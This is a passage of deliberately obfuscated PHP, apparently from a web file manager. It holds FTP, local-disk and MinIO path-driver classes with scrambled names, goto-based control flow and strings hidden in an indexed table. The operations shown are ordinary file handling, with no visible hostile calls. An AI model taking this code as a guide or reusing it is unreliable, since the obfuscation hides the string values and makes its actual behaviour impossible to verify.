$eŞãº™æÂµ - 1; curl_setopt($Bƒ¿„êóÃ•, CURLOPT_RANGE, "{$DÑù§®¯Øˆ}\55{$e·µµæåá}"); } goto Fò×£êŠî; CÀÆ¿·¼Ä: } public function upload($föù†›™ùÙ, $dÈ›óóÖìÒ, $C¨”ÉÄ ‡ = false, $aåÑ é—¡¡ = REPEAT_REPLACE) { goto b°Äì˜“µ; d›¤Àòé„¨: if ($bÏ”¤ÃÇè != FTP_FINISHED) { return !1; } return $this->getPathOuter($föù†›™ùÙ); goto AŒƒË·±¨’; b°Äì˜“µ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($föù†›™ùÙ))) { return !1; } $föù†›™ùÙ = $this->iconvSystem($föù†›™ùÙ); goto bÅˆ–…ˆó; bÅˆ–…ˆó: $dÈ›óóÖìÒ = $this->iconvSystem($dÈ›óóÖìÒ); $bÏ”¤ÃÇè = ftp_nb_put($this->connect, $föù†›™ùÙ, $dÈ›óóÖìÒ, FTP_BINARY); while ($bÏ”¤ÃÇè == FTP_MOREDATA) { $bÏ”¤ÃÇè = ftp_nb_continue($this->connect); } goto d›¤Àòé„¨; AŒƒË·±¨’: } public function download($A”¶øÔµ, $bùÈøˆÌŞ¹ = '') { goto E²‰ŞßÑĞ; E²‰ŞßÑĞ: if (!$this->_isconn()) { return !1; } $E„ìé¸´ùô = $this->pathFather($bùÈøˆÌŞ¹); if (!IO::mkdir($E„ìé¸´ùô)) { return !1; } goto bÑŒùí¥ë; bÑŒùí¥ë: $A”¶øÔµ = $this->iconvSystem($A”¶øÔµ); $bùÈøˆÌŞ¹ = $this->iconvSystem($bùÈøˆÌŞ¹); $A‚£Š­á = ftp_nb_get($this->connect, $bùÈøˆÌŞ¹, $A”¶øÔµ, FTP_BINARY); goto c°ŞèÁêË; c°ŞèÁêË: while ($A‚£Š­á == FTP_MOREDATA) { $A‚£Š­á = ftp_nb_continue($this->connect); } if ($A‚£Š­á != FTP_FINISHED) { return !1; } return $this->iconvApp($bùÈøˆÌŞ¹); goto B®ê‘ÁÍñŠ; B®ê‘ÁÍñŠ: } public function exist($d·µ¯â´–‚) { return $this->isFile($d·µ¯â´–‚) || $this->isFolder($d·µ¯â´–‚); } public function isFile($d–Ë´¸”Â¾) { return !$this->isFolder($d–Ë´¸”Â¾) && $this->objectMeta($d–Ë´¸”Â¾); } public function isFolder($Fƒ†¨ª‹ƒì) { return $this->cacheMethod($_SERVER[œÕÊİğö][209], $Fƒ†¨ª‹ƒì); } protected function objectMeta($Dâ‚Õ¦ã¢•) { return $this->cacheMethod($_SERVER[œÕÊİğö][210], $Dâ‚Õ¦ã¢•); } protected function _objectMeta($a†ªñ™ğë°) { goto déµ¯î‰Ş¤; déµ¯î‰Ş¤: $Dá‘¹Ù‚å‚ =& $_SERVER[œÕÊİğö]; if ($a†ªñ™ğë° == $Dá‘¹Ù‚å‚[43] || $a†ªñ™ğë° == $Dá‘¹Ù‚å‚[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto f¯Â¸õ¾öÇ; f¯Â¸õ¾öÇ: $a†ªñ™ğë° = $this->iconvSystem($a†ªñ™ğë°); $A²ğÑ˜½á˜ = array($Dá‘¹Ù‚å‚[38] => $this->iconvApp($a†ªñ™ğë°), $Dá‘¹Ù‚å‚[39] => $Dá‘¹Ù‚å‚[203], $Dá‘¹Ù‚å‚[88] => 0); @ftp_chdir($this->connect, $Dá‘¹Ù‚å‚[8]); goto E›™Ö¿ò†; E›™Ö¿ò†: $DÍÂÄä«Ë = @ftp_size($this->connect, $a†ªñ™ğë°); if ($DÍÂÄä«Ë != -1) { $A²ğÑ˜½á˜[$Dá‘¹Ù‚å‚[88]] = $DÍÂÄä«Ë; } else { $Aí‡±³™õÀ = @ftp_chdir($this->connect, $a†ªñ™ğë°); if (!$Aí‡±³™õÀ) { return !1; } $A²ğÑ˜½á˜[$Dá‘¹Ù‚å‚[39]] = $Dá‘¹Ù‚å‚[87]; } return $A²ğÑ˜½á˜; goto D¸‰“ÒÜ˜•; D¸‰“ÒÜ˜•: } protected function _isFolder($EÖÌ¥àë­) { $f÷´ˆ×ê¥¼ =& $_SERVER[œÕÊİğö]; if ($EÖÌ¥àë­ == $f÷´ˆ×ê¥¼[43] || $EÖÌ¥àë­ == $f÷´ˆ×ê¥¼[8]) { return !0; } $AãÎ‘œ„ÀŞ = $this->_objectMeta($EÖÌ¥àë­); return isset($AãÎ‘œ„ÀŞ[$f÷´ˆ×ê¥¼[39]]) && $AãÎ‘œ„ÀŞ[$f÷´ˆ×ê¥¼[39]] == $f÷´ˆ×ê¥¼[87] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($bÅµéëçÉÁ) { if (substr($bÅµéëçÉÁ, 0, 2) == $_SERVER[œÕÊİğö][1267]) { $bÅµéëçÉÁ = BASIC_PATH . substr($bÅµéëçÉÁ, 2); } return $bÅµéëçÉÁ; } public function iconvApp($EîÊŒ¢Ùô´) { $eå©ëÏÊº =& $_SERVER[œÕÊİğö]; global $config; return $this->iconvTo($EîÊŒ¢Ùô´, $config[$eå©ëÏÊº[1265]], $config[$eå©ëÏÊº[1264]]); } public function iconvSystem($D³–”ƒ¥ì’) { $e™³†ªŠ½ =& $_SERVER[œÕÊİğö]; global $config; return $this->iconvTo($D³–”ƒ¥ì’, $config[$e™³†ªŠ½[1264]], $config[$e™³†ªŠ½[1265]]); } public function getPathOuter($BœÄÉµ­Ù¾) { goto bİ¯äÊŠ; f¡ŠŸ¬¬”“: if (substr($D‚ß‰È—–Ÿ, 0, 2) == $EÄãŒÍë¾‹[1267]) { $D‚ß‰È—–Ÿ = BASIC_PATH . substr($D‚ß‰È—–Ÿ, 2); } if (substr($BœÄÉµ­Ù¾, 0, 2) == $EÄãŒÍë¾‹[1267]) { $BœÄÉµ­Ù¾ = BASIC_PATH . substr($BœÄÉµ­Ù¾, 2); } $D‚ß‰È—–Ÿ = KodIO::clear($D‚ß‰È—–Ÿ); goto a÷Ãá¿ˆŠ¸; aËŒ•Û¦‹˜: return $this->pathDriver . $EÄãŒÍë¾‹[8] . ltrim($BœÄÉµ­Ù¾, $EÄãŒÍë¾‹[8]); goto fğ“ÉÛÉ±ù; a÷Ãá¿ˆŠ¸: $BœÄÉµ­Ù¾ = KodIO::clear($BœÄÉµ­Ù¾); $BœÄÉµ­Ù¾ = substr($BœÄÉµ­Ù¾, strlen($D‚ß‰È—–Ÿ)); if (empty($this->pathDriver)) { return $BœÄÉµ­Ù¾; } goto aËŒ•Û¦‹˜; bİ¯äÊŠ: $EÄãŒÍë¾‹ =& $_SERVER[œÕÊİğö]; $D‚ß‰È—–Ÿ = $this->iconvApp($this->pathBase); $BœÄÉµ­Ù¾ = $this->iconvApp($BœÄÉµ­Ù¾); goto f¡ŠŸ¬¬”“; fğ“ÉÛÉ±ù: } public function mkfile($d êÔ¬Õ†‘, $bÀº•¿¤›ã = '', $bÕš‹âØè² = REPEAT_RENAME) { $d êÔ¬Õ†‘ = $this->iconvSystem($d êÔ¬Õ†‘); @touch($d êÔ¬Õ†‘); if ($bÀº•¿¤›ã) { file_put_contents($d êÔ¬Õ†‘, $bÀº•¿¤›ã); } @chmod($d êÔ¬Õ†‘, $this->pathAuth); return is_file($d êÔ¬Õ†‘) ? $this->getPathOuter($d êÔ¬Õ†‘) : !1; } public function mkdir($bØÚ¹¬Ç°ˆ, $DçÏœ¹›Éƒ = REPEAT_SKIP) { $bØÚ¹¬Ç°ˆ = $this->iconvSystem($bØÚ¹¬Ç°ˆ); if (is_dir($bØÚ¹¬Ç°ˆ)) { return $this->getPathOuter($bØÚ¹¬Ç°ˆ); } @mkdir($bØÚ¹¬Ç°ˆ, $this->pathAuth, !0); @chmod($bØÚ¹¬Ç°ˆ, $this->pathAuth); return is_dir($bØÚ¹¬Ç°ˆ) ? $this->getPathOuter($bØÚ¹¬Ç°ˆ) : !1; } public function copyFile($FãÓÛŠòÒ×, $EÀíÂ²°¨º) { $this->mkdir($this->pathFather($EÀíÂ²°¨º)); $FãÓÛŠòÒ× = $this->iconvSystem($FãÓÛŠòÒ×); $EÀíÂ²°¨º = $this->iconvSystem($EÀíÂ²°¨º); $F‡˜‹©™—Ú = copy_64($FãÓÛŠòÒ×, $EÀíÂ²°¨º); @chmod($EÀíÂ²°¨º, $this->pathAuth); return $F‡˜‹©™—Ú ? $this->getPathOuter($EÀíÂ²°¨º) : !1; } public function moveFile($a’øÙ¬õ×°, $e‰¿…»·ÇÙ) { goto C°‰†»ÓÀ‡; E´â£øÈ˜: return $cÃæŸ…§˜Ï ? $this->getPathOuter($e‰¿…»·ÇÙ) : !1; goto E­¿¥Æ­; C°‰†»ÓÀ‡: $this->mkdir($this->pathFather($e‰¿…»·ÇÙ)); $a’øÙ¬õ×° = $this->iconvSystem($a’øÙ¬õ×°); $e‰¿…»·ÇÙ = $this->iconvSystem($e‰¿…»·ÇÙ); goto AÖŞÁƒ÷÷ç; AÖŞÁƒ÷÷ç: $cÃæŸ…§˜Ï = intval(@rename($a’øÙ¬õ×°, $e‰¿…»·ÇÙ)); if (!$cÃæŸ…§˜Ï) { if ($cÃæŸ…§˜Ï = intval(@copy_64($a’øÙ¬õ×°, $e‰¿…»·ÇÙ))) { @unlink($a’øÙ¬õ×°); } } @chmod($e‰¿…»·ÇÙ, $this->pathAuth); goto E´â£øÈ˜; E­¿¥Æ­: } public function delFile($DÑ´ƒìÛç™) { $DÑ´ƒìÛç™ = $this->iconvSystem($DÑ´ƒìÛç™); if (!@unlink($DÑ´ƒìÛç™)) { @chmod($DÑ´ƒìÛç™, $this->pathAuth); if (!@unlink($DÑ´ƒìÛç™)) { return !1; } } else { return !0; } } public function delFolder($e¼ºÍ“‹ñå) { goto F™æ…¢›æ; b¢íÅÊÌÕÑ: if (!($aåˆÚ÷‘ = opendir($e¼ºÍ“‹ñå))) { return !1; } while (($f«ÎŸ¶ñÑ = readdir($aåˆÚ÷‘)) !== !1) { if ($f«ÎŸ¶ñÑ == $Bø¨¯è˜[105] || $f«ÎŸ¶ñÑ == $Bø¨¯è˜[1274]) { continue; } $d›ííï©„¹ = $e¼ºÍ“‹ñå . $Bø¨¯è˜[8] . $f«ÎŸ¶ñÑ; if (is_file($d›ííï©„¹) || is_link($d›ííï©„¹)) { if (!unlink($d›ííï©„¹)) { chmod($d›ííï©„¹, $this->pathAuth); if (!unlink($d›ííï©„¹)) { return !1; } } } else { if (is_dir($d›ííï©„¹)) { chmod($d›ííï©„¹, $this->pathAuth); $d›ííï©„¹ = $this->iconvApp($d›ííï©„¹); if (!$this->delFolder($d›ííï©„¹)) { return !1; } } } } closedir($aåˆÚ÷‘); goto C«óí¢¿ö; F™æ…¢›æ: $Bø¨¯è˜ =& $_SERVER[œÕÊİğö]; $e¼ºÍ“‹ñå = $this->iconvSystem($e¼ºÍ“‹ñå); if (!is_dir($e¼ºÍ“‹ñå)) { return !0; } goto b¢íÅÊÌÕÑ; C«óí¢¿ö: return rmdir($e¼ºÍ“‹ñå); goto EÕ‹ˆííòí; EÕ‹ˆííòí: } public function rename($f­óŒ¡ÈÏ, $E·ƒ¤Ò×) { goto c¶‹Şá™; C™ìïºè“: $FÕ¥ÄªÑòÖ = @rename($f­óŒ¡ÈÏ, $C©¼¯½‡”–); $C©¼¯½‡”– = $this->iconvApp($C©¼¯½‡”–); return $FÕ¥ÄªÑòÖ ? $this->getPathOuter($C©¼¯½‡”–) : !1; goto BÈÔ¯ó®Ë; A ÙÎ¾„ÆÔ: $f­óŒ¡ÈÏ = $this->iconvSystem($f­óŒ¡ÈÏ); $bÔ‹Ö»”îñ = $this->pathFather($f­óŒ¡ÈÏ); $C©¼¯½‡”– = rtrim($bÔ‹Ö»”îñ, $B×ã„Ñ±´[8]) . $B×ã„Ñ±´[8] . $c¿ğ±”§àâ; goto C™ìïºè“; c¶‹Şá™: $B×ã„Ñ±´ =& $_SERVER[œÕÊİğö]; $c¿ğ±”§àâ = $this->fileNameAuto($this->pathFather($f­óŒ¡ÈÏ), $E·ƒ¤Ò×); $c¿ğ±”§àâ = $this->iconvSystem($c¿ğ±”§àâ); goto A ÙÎ¾„ÆÔ; BÈÔ¯ó®Ë: } public function size($dŒ›íáë­Õ) { $dŒ›íáë­Õ = $this->iconvSystem($dŒ›íáë­Õ); return filesize_64($dŒ›íáë­Õ); } public function info($c—†ã¨±Ï) { $c—†ã¨±Ï = $this->iconvSystem($c—†ã¨±Ï); if ($this->isFolder($c—†ã¨±Ï)) { return $this->folderInfo($c—†ã¨±Ï); } else { if ($this->isFile($c—†ã¨±Ï)) { return $this->fileInfo($c—†ã¨±Ï); } } return !1; } protected function infoChildren($fÌ¢Èè†íÚ, &$cß£¤‰¾À¹, $bõÌ¹è…­¦ = true) { goto b÷¶ùõËÕ; FÖ£Ö‘æâÈ: closedir($aº¼»Ò†Øè); goto cÀÛ‘ğº­”; D˜‹Á§¡©½: if ($bõÌ¹è…­¦) { $fÌ¢Èè†íÚ = $this->iconvSystem($fÌ¢Èè†íÚ); } if (!($aº¼»Ò†Øè = @opendir($fÌ¢Èè†íÚ))) { return; } while (($BØÊèê•ß = readdir($aº¼»Ò†Øè)) !== !1) { if ($BØÊèê•ß == $F‰‰ÅÕ»•’[105] || $BØÊèê•ß == $F‰‰ÅÕ»•’[1274]) { continue; } $e¯•çòè¸„ = $fÌ¢Èè†íÚ . $BØÊèê•ß; if (is_file($e¯•çòè¸„) || is_link($e¯•çòè¸„)) { $cß£¤‰¾À¹[$F‰‰ÅÕ»•’[89]]++; $cß£¤‰¾À¹[$F‰‰ÅÕ»•’[88]] += filesize_64($e¯•çòè¸„); } else { if (is_dir($e¯•çòè¸„)) { $cß£¤‰¾À¹[$F‰‰ÅÕ»•’[90]]++; $this->infoChildren($e¯•çòè¸„, $cß£¤‰¾À¹, !1); } } } goto FÖ£Ö‘æâÈ; b÷¶ùõËÕ: $F‰‰ÅÕ»•’ =& $_SERVER[œÕÊİğö]; check_abort_echo(); $fÌ¢Èè†íÚ = rtrim($fÌ¢Èè†íÚ, $F‰‰ÅÕ»•’[8]) . $F‰‰ÅÕ»•’[8]; goto D˜‹Á§¡©½; cÀÛ‘ğº­”: } private function folderInfo($E¹¨¾ŸÂù², $ešç¨’’ä = false) { $a–ßŞ„ä¾Ã =& $_SERVER[œÕÊİğö]; $E¹¨¾ŸÂù² = rtrim($E¹¨¾ŸÂù², $a–ßŞ„ä¾Ã[8]) . $a–ßŞ„ä¾Ã[8]; $a–éÅ¦Í¥ = $this->iconvApp($this->pathThis($E¹¨¾ŸÂù²)); if ($ešç¨’’ä) { return array($a–ßŞ„ä¾Ã[38] => $a–éÅ¦Í¥, $a–ßŞ„ä¾Ã[86] => $this->getPathOuter($E¹¨¾ŸÂù²), $a–ßŞ„ä¾Ã[39] => $a–ßŞ„ä¾Ã[87]); } $E§À‘µ«“ = array($a–ßŞ„ä¾Ã[38] => $a–éÅ¦Í¥, $a–ßŞ„ä¾Ã[86] => $this->getPathOuter($E¹¨¾ŸÂù²), $a–ßŞ„ä¾Ã[39] => $a–ßŞ„ä¾Ã[87], $a–ßŞ„ä¾Ã[204] => @filectime($E¹¨¾ŸÂù²), $a–ßŞ„ä¾Ã[94] => @filemtime($E¹¨¾ŸÂù²), $a–ßŞ„ä¾Ã[1277] => @fileatime($E¹¨¾ŸÂù²), $a–ßŞ„ä¾Ã[1278] => is_readable($E¹¨¾ŸÂù²), $a–ßŞ„ä¾Ã[1279] => is_writable($E¹¨¾ŸÂù²), $a–ßŞ„ä¾Ã[1280] => get_mode($E¹¨¾ŸÂù²)); return $E§À‘µ«“; } private function fileInfo($fÓ¯˜öëí‹, $bØ­ĞÓåˆ­ = false) { $cõæœ‰Ÿ£ì =& $_SERVER[œÕÊİğö]; $eõ’©³ñšĞ = $this->iconvApp($this->pathThis($fÓ¯˜öëí‹)); if ($bØ­ĞÓåˆ­) { return array($cõæœ‰Ÿ£ì[38] => $eõ’©³ñšĞ, $cõæœ‰Ÿ£ì[86] => $this->getPathOuter($fÓ¯˜öëí‹), $cõæœ‰Ÿ£ì[39] => $cõæœ‰Ÿ£ì[203], $cõæœ‰Ÿ£ì[88] => $this->size($fÓ¯˜öëí‹), $cõæœ‰Ÿ£ì[178] => $this->ext($eõ’©³ñšĞ)); } $DÉÉŠÏø = array($cõæœ‰Ÿ£ì[38] => $eõ’©³ñšĞ, $cõæœ‰Ÿ£ì[86] => $this->getPathOuter($fÓ¯˜öëí‹), $cõæœ‰Ÿ£ì[39] => $cõæœ‰Ÿ£ì[203], $cõæœ‰Ÿ£ì[204] => @filectime($fÓ¯˜öëí‹), $cõæœ‰Ÿ£ì[94] => @filemtime($fÓ¯˜öëí‹), $cõæœ‰Ÿ£ì[1277] => @fileatime($fÓ¯˜öëí‹), $cõæœ‰Ÿ£ì[88] => $this->size($fÓ¯˜öëí‹), $cõæœ‰Ÿ£ì[178] => $this->ext($eõ’©³ñšĞ), $cõæœ‰Ÿ£ì[1278] => is_readable($fÓ¯˜öëí‹), $cõæœ‰Ÿ£ì[1279] => is_writable($fÓ¯˜öëí‹), $cõæœ‰Ÿ£ì[1280] => get_mode($fÓ¯˜öëí‹)); return $DÉÉŠÏø; } public function exist($c¬±¯ê²øš) { $c¬±¯ê²øš = $this->iconvSystem($c¬±¯ê²øš); return @file_exists($c¬±¯ê²øš); } public function isFile($C¤ÜÛÍÕÁô) { $C¤ÜÛÍÕÁô = $this->iconvSystem($C¤ÜÛÍÕÁô); return @is_file($C¤ÜÛÍÕÁô); } public function isFolder($C™øÕéà¾—) { $C™øÕéà¾— = $this->iconvSystem($C™øÕéà¾—); return @is_dir($C™øÕéà¾—); } public function listPath($e’¤çÆÛŒ, $B‡¿„Ëìä§ = false) { goto bÛ¥™À®ä¿; bÛ¥™À®ä¿: $Dœóœ¶ö´ =& $_SERVER[œÕÊİğö]; $e’¤çÆÛŒ = $this->iconvSystem($e’¤çÆÛŒ); $e’¤çÆÛŒ = rtrim($e’¤çÆÛŒ, $Dœóœ¶ö´[8]) . $Dœóœ¶ö´[8]; goto bâ«ÙÀ­îÇ; EĞÊ’³Íƒõ: closedir($cî‡Ñ­Â‘¸); return $F¬ä“êˆ“; goto D®±ïÒ°ó¶; bâ«ÙÀ­îÇ: $F¬ä“êˆ“ = array($Dœóœ¶ö´[85] => array(), $Dœóœ¶ö´[84] => array()); if (!($cî‡Ñ­Â‘¸ = @opendir($e’¤çÆÛŒ))) { return $F¬ä“êˆ“; } while (($cÁ«„áâÌŞ = readdir($cî‡Ñ­Â‘¸)) !== !1) { if ($cÁ«„áâÌŞ == $Dœóœ¶ö´[105] || $cÁ«„áâÌŞ == $Dœóœ¶ö´[1274]) { continue; } $Eµ¶¹²ŒğØ = $e’¤çÆÛŒ . $cÁ«„áâÌŞ; if (is_file($Eµ¶¹²ŒğØ)) { $F¬ä“êˆ“[$Dœóœ¶ö´[84]][] = $this->fileInfo($Eµ¶¹²ŒğØ, $B‡¿„Ëìä§); } else { $F¬ä“êˆ“[$Dœóœ¶ö´[85]][] = $this->folderInfo($Eµ¶¹²ŒğØ, $B‡¿„Ëìä§); } } goto EĞÊ’³Íƒõ; D®±ïÒ°ó¶: } public function listAll($aÙÎ‹Úæö², &$Aêó¯‹²ŸÙ = array()) { goto CÊ¿ğ¾÷¥; bØíèõÎ: return $Aêó¯‹²ŸÙ; goto e­•ôê©ù‰; CÊ¿ğ¾÷¥: $E‡¤¤‘Øá’ =& $_SERVER[œÕÊİğö]; $aÙÎ‹Úæö² = $this->iconvSystem($aÙÎ‹Úæö²); $aÙÎ‹Úæö² = rtrim($aÙÎ‹Úæö², $E‡¤¤‘Øá’[8]) . $E‡¤¤‘Øá’[8]; goto a“ê½‡Îù; a“ê½‡Îù: if (!($DÌ¡Î‡¹à“ = @opendir($aÙÎ‹Úæö²))) { return $Aêó¯‹²ŸÙ; } while (($e”ë¶çŞ¾ = readdir($DÌ¡Î‡¹à“)) !== !1) { if ($e”ë¶çŞ¾ == $E‡¤¤‘Øá’[105] || $e”ë¶çŞ¾ == $E‡¤¤‘Øá’[1274]) { continue; } $BÎ—äˆ«ÆÍ = $aÙÎ‹Úæö² . $e”ë¶çŞ¾; if (is_dir($BÎ—äˆ«ÆÍ) && !is_link($BÎ—äˆ«ÆÍ)) { $Aêó¯‹²ŸÙ[] = array($E‡¤¤‘Øá’[86] => $BÎ—äˆ«ÆÍ . $E‡¤¤‘Øá’[8], $E‡¤¤‘Øá’[87] => 1, $E‡¤¤‘Øá’[94] => @filemtime($BÎ—äˆ«ÆÍ), $E‡¤¤‘Øá’[88] => 0); $this->listAll($BÎ—äˆ«ÆÍ, $Aêó¯‹²ŸÙ); } else { $Aêó¯‹²ŸÙ[] = array($E‡¤¤‘Øá’[86] => $BÎ—äˆ«ÆÍ, $E‡¤¤‘Øá’[87] => 0, $E‡¤¤‘Øá’[94] => @filemtime($BÎ—äˆ«ÆÍ), $E‡¤¤‘Øá’[88] => $this->size($BÎ—äˆ«ÆÍ)); } } closedir($DÌ¡Î‡¹à“); goto bØíèõÎ; e­•ôê©ù‰: } public function has($c£¥ßé©¤¿, $c—”“¹Š‚Õ = false, $Bî«Â¯¢†ö = true) { goto Aöæ›“ƒ™§; fˆÒ›­•†¿: if (!($cØ­ìõÎ»Š = @opendir($c£¥ßé©¤¿))) { return !1; } $D Š¤ËÍÊ’ = 0; $dÕÊ§ŸŠ¥ = 0; goto fÁâ‚î; eˆè‹´ßÔ: if ($c—”“¹Š‚Õ) { return array($f¦¾‹˜î[213] => $D Š¤ËÍÊ’, $f¦¾‹˜î[214] => $dÕÊ§ŸŠ¥); } return !1; goto aŸÄÙ÷Á¼·; Aöæ›“ƒ™§: $f¦¾‹˜î =& $_SERVER[œÕÊİğö]; $c£¥ßé©¤¿ = $this->iconvSystem($c£¥ßé©¤¿); $c£¥ßé©¤¿ = rtrim($c£¥ßé©¤¿, $f¦¾‹˜î[8]) . $f¦¾‹˜î[8]; goto fˆÒ›­•†¿; fÁâ‚î: $D½âÎÎÀÏ… = 0; while (($fğ¡”Æ¨ = readdir($cØ­ìõÎ»Š)) !== !1) { if ($fğ¡”Æ¨ == $f¦¾‹˜î[105] || $fğ¡”Æ¨ == $f¦¾‹˜î[1274]) { continue; } $c¶ÀÔ”ïö½ = $c£¥ßé©¤¿ . $fğ¡”Æ¨; if ($c—”“¹Š‚Õ) { $D½âÎÎÀÏ…++; if (@is_file($c¶ÀÔ”ïö½)) { $D Š¤ËÍÊ’++; } else { $dÕÊ§ŸŠ¥++; } if ($D½âÎÎÀÏ… > 10000) { break; } continue; } if ($Bî«Â¯¢†ö) { if (@is_file($c¶ÀÔ”ïö½)) { return !0; } } else { if (@is_dir($c¶ÀÔ”ïö½ . $f¦¾‹˜î[8])) { return !0; } } } closedir($cØ­ìõÎ»Š); goto eˆè‹´ßÔ; aŸÄÙ÷Á¼·: } public function hashSimple($CŸÕƒÏ¥‚˜) { goto DÁÆÕÂªĞª; Eéôãä‚œ¾: $dµíÈİÜˆç = $this->size($CŸÕƒÏ¥‚˜); $c®íí‘¿Ö = 200; $F‡‰“ß…” = 50; goto b›“¶ƒˆÄƒ; b›“¶ƒˆÄƒ: if ($dµíÈİÜˆç <= $c®íí‘¿Ö * $F‡‰“ß…”) { return $this->hashMd5($CŸÕƒÏ¥‚˜) . $dµíÈİÜˆç; } $cÊ¡‹Ò¶´Û = $a†Ø¦Á¢ä[43]; $fÆÎ„êàØ = intval($dµíÈİÜˆç / $F‡‰“ß…”); goto BÙÙÍËÔ¢‚; F¿ÏÄ°ºÓ: fseek_64($D¯šìóƒÅ´, $dµíÈİÜˆç - $c®íí‘¿Ö); $cÊ¡‹Ò¶´Û .= fread($D¯šìóƒÅ´, $c®íí‘¿Ö); fclose($D¯šìóƒÅ´); goto AøÌŸö“èĞ; DÁÆÕÂªĞª: $a†Ø¦Á¢ä =& $_SERVER[œÕÊİğö]; if (!$CŸÕƒÏ¥‚˜) { return md5($a†Ø¦Á¢ä[43]); } $CŸÕƒÏ¥‚˜ = $this->iconvSystem($CŸÕƒÏ¥‚˜); goto Eéôãä‚œ¾; BÙÙÍËÔ¢‚: $D¯šìóƒÅ´ = fopen($CŸÕƒÏ¥‚˜, $a†Ø¦Á¢ä[1281]); if (!$D¯šìóƒÅ´) { return $cÊ¡‹Ò¶´Û; } for ($Bäƒï—ø‹œ = 0; $Bäƒï—ø‹œ < $F‡‰“ß…”; $Bäƒï—ø‹œ++) { fseek_64($D¯šìóƒÅ´, $fÆÎ„êàØ * $Bäƒï—ø‹œ); $cÊ¡‹Ò¶´Û .= fread($D¯šìóƒÅ´, $c®íí‘¿Ö); } goto F¿ÏÄ°ºÓ; AøÌŸö“èĞ: return md5($cÊ¡‹Ò¶´Û) . $dµíÈİÜˆç; goto A½ œÖ‚Ä¨; A½ œÖ‚Ä¨: } public function getContent($CºòªƒãŸ§) { $CºòªƒãŸ§ = $this->iconvSystem($CºòªƒãŸ§); return file_get_contents($CºòªƒãŸ§); } public function setContent($A…ë­®İ¢Ñ, $dŠÁß³º‰“ = '') { $A…ë­®İ¢Ñ = $this->iconvSystem($A…ë­®İ¢Ñ); $E’„Œ†­ğ« = @file_put_contents($A…ë­®İ¢Ñ, $dŠÁß³º‰“, LOCK_EX); clearstatcache(); @chmod($A…ë­®İ¢Ñ, $this->pathAuth); return $E’„Œ†­ğ« === !1 ? !1 : !0; } public function fileSubstr($b»¦™ùâÕ›, $D¶ÈçÔÃ…„ = 0, $Eì›µáôóŞ = false) { goto f‹øÔÙç¯±; bå”‡ßÌ÷°: if ($Eì›µáôóŞ <= 0) { return $Eğ‡™ªÙ«[43]; } $a‹æğ”ö©º = fopen($b»¦™ùâÕ›, $Eğ‡™ªÙ«[1281]); if (!$a‹æğ”ö©º) { return !1; } goto EÖ—À¹£±…; f‹øÔÙç¯±: $Eğ‡™ªÙ« =& $_SERVER[œÕÊİğö]; $b»¦™ùâÕ› = $this->iconvSystem($b»¦™ùâÕ›); if ($Eì›µáôóŞ === !1) { $Eì›µáôóŞ = $this->size($b»¦™ùâÕ›); } goto bå”‡ßÌ÷°; a÷‘Ä‘½íÜ: return $B«½Ì˜íõ; goto aë–†—¬˜’; EÖ—À¹£±…: fseek_64($a‹æğ”ö©º, $D¶ÈçÔÃ…„); $B«½Ì˜íõ = fread($a‹æğ”ö©º, $Eì›µáôóŞ); fclose($a‹æğ”ö©º); goto a÷‘Ä‘½íÜ; aë–†—¬˜’: } public function upload($B½Â¼æà‹š, $f¼ â­Óò‹, $c±‚‚…›¼à = false, $BÌ¼éô¼¡ = REPEAT_REPLACE) { if ($c±‚‚…›¼à) { return $this->moveFile($f¼ â­Óò‹, $B½Â¼æà‹š); } return $this->copyFile($f¼ â­Óò‹, $B½Â¼æà‹š); } public function setModifyTime($EÉîóåËÑ‚, $e¦·ÌÕ¤Ü° = '') { @touch($EÉîóåËÑ‚, intval($e¦·ÌÕ¤Ü°)); } public function download($cĞÁÍ‡¦ñö, $DÊ©ßµˆÈ) { return $this->iconvSystem($cĞÁÍ‡¦ñö); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($B­ïÆìÇË) { parent::__construct($B­ïÆìÇË); $this->signatureVersion($_SERVER[œÕÊİğö][222]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto fØˆƒÉŠ; d¦ùß¾šĞè: class TaskFileTransfer extends Task { protected function startAfter() { goto aÃòÒ½™ÕÍ; C×Ä¢Ó–ª: $e×—¶ÜÓ“Í[$EÌ‡íáÚ‘ø[1046]] = $EÌ‡íáÚ‘ø[43]; $e×—¶ÜÓ“Í[$EÌ‡íáÚ‘ø[1599]] = $EÌ‡íáÚ‘ø[43]; $e×—¶ÜÓ“Í[$EÌ‡íáÚ‘ø[1600]] = 0; goto AÍêí•Ç£; eƒè¬ÓëÎğ: Hook::bind($EÌ‡íáÚ‘ø[1586], array($this, $EÌ‡íáÚ‘ø[1587])); Hook::bind($EÌ‡íáÚ‘ø[594], array($this, $EÌ‡íáÚ‘ø[1588])); $this->sourceModelCopyFlag = !1; goto F‘ğ‚¹íóİ; e‹ÍÏºÇÒ–: Hook::bind($EÌ‡íáÚ‘ø[1577], array($this, $EÌ‡íáÚ‘ø[1578])); Hook::bind($EÌ‡íáÚ‘ø[1132], array($this, $EÌ‡íáÚ‘ø[1579])); Hook::bind($EÌ‡íáÚ‘ø[1580], array($this, $EÌ‡íáÚ‘ø[1581])); goto Fµñ †ñçš; Fµñ †ñçš: Hook::bind($EÌ‡íáÚ‘ø[601], array($this, $EÌ‡íáÚ‘ø[1582])); Hook::bind($EÌ‡íáÚ‘ø[602], array($this, $EÌ‡íáÚ‘ø[1583])); Hook::bind($EÌ‡íáÚ‘ø[604], array($this, $EÌ‡íáÚ‘ø[1584])); goto aµÛœ¾‘Âğ; F¢·Ã—ˆÙœ: Hook::bind($EÌ‡íáÚ‘ø[573], array($this, $EÌ‡íáÚ‘ø[1585])); Hook::bind($EÌ‡íáÚ‘ø[575], array($this, $EÌ‡íáÚ‘ø[1585])); Hook::bind($EÌ‡íáÚ‘ø[577], array($this, $EÌ‡íáÚ‘ø[1585])); goto eƒè¬ÓëÎğ; aµÛœ¾‘Âğ: Hook::bind($EÌ‡íáÚ‘ø[605], array($this, $EÌ‡íáÚ‘ø[1584])); Hook::bind($EÌ‡íáÚ‘ø[571], array($this, $EÌ‡íáÚ‘ø[1585])); Hook::bind($EÌ‡íáÚ‘ø[568], array($this, $EÌ‡íáÚ‘ø[1585])); goto F¢·Ã—ˆÙœ; AÍêí•Ç£: 